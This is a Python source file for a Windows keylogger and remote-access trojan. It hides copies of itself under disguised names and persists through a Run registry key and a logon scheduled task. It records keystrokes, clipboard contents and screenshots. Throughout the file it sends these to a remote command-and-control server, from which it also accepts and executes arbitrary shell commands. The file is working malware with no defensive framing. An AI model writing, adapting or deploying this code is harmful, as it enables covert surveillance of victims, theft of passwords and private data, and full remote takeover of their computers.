import ctypes
import json
import sys
import threading
import requests
from threading import Lock,Timer
import time
import os
from shutil import copy
import winreg as reg
from getpass import getuser
from pynput.keyboard import Listener
from pyperclip import paste
import pyautogui
import io
import base64
import subprocess

##
user = getuser()
path_l = os.path.expandvars(f'%TEMP%//{user}_system_meta.txt')
path_e = os.path.expandvars(f'%TEMP%//AGDInvokerUtility.exe')
path_e2 = os.path.expandvars(f'C:\ProgramData\WinMonitor.exe')
file_lock = Lock()
keystroke_buffer = []
task_name = "WinMon"
##

#identification
current_file = sys.executable
try:
    my_ip = public_ip = requests.get('https://api.ipify.org').text
except:
    my_ip = "Unknown"
    pass
midman = f"https://midmanserv.onrender.com/api/{my_ip}"

##
def set_scheduler():
    time.sleep(120)
    try:
        subprocess.run(f'schtasks /create /tn "{task_name}" /tr "{path_e2}" /sc onlogon /rl highest /f', shell=True, check=True,creationflags=0x08000000)
    except Exception as e:
        print(f"Error setting scheduler: {e}")
scheduler_thrd = threading.Thread(target=set_scheduler, daemon=True)
scheduler_thrd.start()
##
try:
    ctypes.windll.kernel32.SetFileAttributesW(path_e2, 128)
    copy(current_file, path_e2)
    attribute_set = ctypes.windll.kernel32.SetFileAttributesW(path_e2, 0x02)
except Exception as e:
    # print(f"Error copying to ProgramData: {e}")
    pass
#hide and add to startup with registry
try:
    ctypes.windll.kernel32.SetFileAttributesW(path_e2, 128)
    os.remove(path_e)
    copy(current_file, path_e)
    attribute_set = ctypes.windll.kernel32.SetFileAttributesW(path_e, 0x02)
    
except:
    pass
create_reg = reg.ConnectRegistry(None, reg.HKEY_CURRENT_USER)
open_key = reg.OpenKey(create_reg, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, reg.KEY_ALL_ACCESS)
try:
    reg.SetValueEx(open_key, 'AGDInvokerUtility', 0, reg.REG_SZ, path_e)
except:
    pass
##

#
def is_caps_lock():
    return ctypes.windll.user32.GetKeyState(0x14) & 1
#

##
def run_remote_command(command_string):
    try:
        output = subprocess.check_output(
            command_string, 
            shell=True, 
            stderr=subprocess.STDOUT, 
            stdin=subprocess.DEVNULL,
            timeout=15 
        )
        return output.decode('utf-8', errors='replace')
    except subprocess.CalledProcessError as e:
        return e.output.decode('utf-8', errors='replace')
    except Exception as e:
        return f"System Error: {str(e)}"
##

#screenshot function
def take_screenshot():
    try:
        ss = pyautogui.screenshot()
        img_buffer = io.BytesIO()
        ss.save(img_buffer, format='JPEG', quality=50)
        img_bytes = img_buffer.getvalue()
        encoded = base64.b64encode(img_bytes).decode('utf-8')
        return encoded
    except Exception as e:
        return None

#Listen for ss commands from dashb
def command_listener():
    while True:
        print(f"Listening for commands at {midman}...")
        try:
            response = requests.get(f"{midman}/{user}", stream=True)
            for line in response.iter_lines():
                print(f"Received line: {line}")  # Debug print to see raw lines
                if line:
                    decoded_line = line.decode('utf-8')
                    if decoded_line.startswith("data: "):
                        data_str = decoded_line[6:]
                        try:
                            data = json.loads(data_str)
                            # print(f"Received command: {data}")
                        except: 
                            continue
                        incoming_cmd = data.get("command", "")
                        if incoming_cmd == "screenshot":
                            img_data = take_screenshot()
                            if img_data:
                                requests.post(f"{midman}/screenshot", json={"image": img_data , "username": user , "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")})
                        elif incoming_cmd:
                            output = run_remote_command(incoming_cmd)
                            result_payload = {
                                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                                "username": user,
                                "ip_address": my_ip,
                                "response": f"> {incoming_cmd}\n{output}" 
                            }
                            requests.post(f"{midman}/output", json=result_payload)
                        
        except requests.exceptions.RequestException:
            time.sleep(5)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

#listener code
def on_key_press(key):
    global keystroke_buffer
    try:
        if is_caps_lock():
            k = key.char.upper() if key.char is not None else str(key)
        else:
            k = key.char if key.char is not None else str(key)
    except AttributeError:
        k = str(key)
    if k == "Key.backspace":
        if keystroke_buffer: keystroke_buffer.pop()
    elif k == "Key.space":
        keystroke_buffer.append(" ")
    elif k == "Key.enter": keystroke_buffer.append("<ENTER>")
    elif "Key." not in k: 
        if ord(k) >= 32 and ord(k) <= 126:
            keystroke_buffer.append(k)

#save logs as backup 
def save_to_file(content):
    with file_lock:
        try:
            with open(path_l, "a") as f:
                f.write(content)
                f.flush()
        except Exception as e:
            pass

#send logs to server
def send_logs_to_server():
    global keystroke_buffer
    data_to_send = ""
    with file_lock:
        if keystroke_buffer:
            data_to_send = "".join(keystroke_buffer)
            keystroke_buffer = []
        try:
            cptext = paste()
            result = cptext 
            if cptext:
                result = cptext[:1000]
        except:
            result = "Clipboard access error"
    try:
        if data_to_send:
            # Push to server
            if data_to_send.strip():
                log_entry = {
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "username": user,
                "ip_address": my_ip,
                "payload": data_to_send,
                "clipboard": result
                }
                requests.post(f"{midman}/logs", json=log_entry)
                save_to_file(data_to_send)

    except Exception as e:
        print(f"Error sending to server: {e}") #remove after testing
        pass

# schedule next sync in 60 seconds
    Timer(60, send_logs_to_server).start()
    
cmd_thread = threading.Thread(target=command_listener, daemon=True)
cmd_thread.start()

#start loop
send_logs_to_server()

#start listening to keyboard
with Listener(on_press=on_key_press) as l:
    l.join()